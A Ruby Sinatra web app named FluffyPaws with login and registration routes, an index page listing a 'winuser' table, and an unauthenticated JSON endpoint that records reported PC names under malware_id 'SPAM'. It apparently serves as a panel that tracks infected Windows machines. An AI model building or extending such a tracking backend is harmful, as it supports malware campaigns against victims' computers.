module FluffyPaws
  class App < Sinatra::Base
    enable :sessions
    register Sinatra::Helpers

    configure do
      set :session_secret, load_secret
    end

    DB = Sequel.connect(ENV.fetch('DATABASE_URL'))

    get '/' do
      authorize!
      @all_pcs = DB[:winuser].all

      @username = session[:username] unless session[:username].nil?

      haml :index
    end

    get '/register' do
      redirect to('/') if authorized?
      if session[:register_error]
        @error = session[:register_error]
        session[:register_error] = nil
      end
      haml :register
    end

    post '/register' do
      user_repository = Repositories::User.new(DB)
      register = Interactions::Register.new(user_repository)
      register.run(user_name: params[:user_name],
                   email: params[:email],
                   password: params[:password])
      if register.session
        session[:user_id] = register.session
        redirect to('/')
      else
        session[:register_error] = register.error
        redirect to('/register')
      end
    end

    get '/login' do
      redirect to('/') if authorized?
      if session[:login_error]
        @error = session[:login_error]
        session[:login_error] = nil
      end
      haml :login
    end

    post '/login' do
      user_repository = Repositories::User.new(DB)
      login = Interactions::Login.new(user_repository)
      login.run(username: params[:user],
                password: params[:password])

      if login.session
        session[:user_id] = login.session
        redirect to('/')
      else
        session[:login_error] = login.error
        redirect to('/login')
      end
    end

    get '/logout' do
      logout!
      redirect to('/login')
    end

    post '/json' do
      ds = DB[:winuser]
      request.body.rewind
      req_data = JSON.parse request.body.read

      data_kind = req_data['pc_data']['kind']
      pc_name = req_data['pc_data']['data']['Name']

      if data_kind == 'PC info'
        pc_name = 'PC name empty' if pc_name == ''
        puts ds.insert(pc_name: pc_name, malware_id: 'SPAM')
      end
    end
  end
end
